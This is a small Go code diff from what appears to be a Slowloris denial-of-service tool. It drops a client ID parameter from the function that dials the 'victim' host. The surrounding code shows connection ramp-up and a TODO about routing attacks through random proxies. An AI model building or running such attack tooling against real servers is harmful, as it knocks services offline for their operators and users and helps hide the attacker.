@@ -95,7 +95,7 @@ func (s SlowLoris) dialWorker(stopChan chan bool, logger *zap.Logger, config *Co
 		default:
 			time.Sleep(config.RampUpInterval)
 
-			if conn := s.dialVictim(logger, targetHostPort, isTLS, config.ClientID); conn != nil {
+			if conn := s.dialVictim(logger, targetHostPort, isTLS); conn != nil {
 				go s.doLoris(logger, config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
 		}
@@ -110,7 +110,7 @@ func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool, clientID string) io.ReadWriteCloser {
+func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool) io.ReadWriteCloser {
 	// TODO: add support for dialing the Path via a random proxy from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
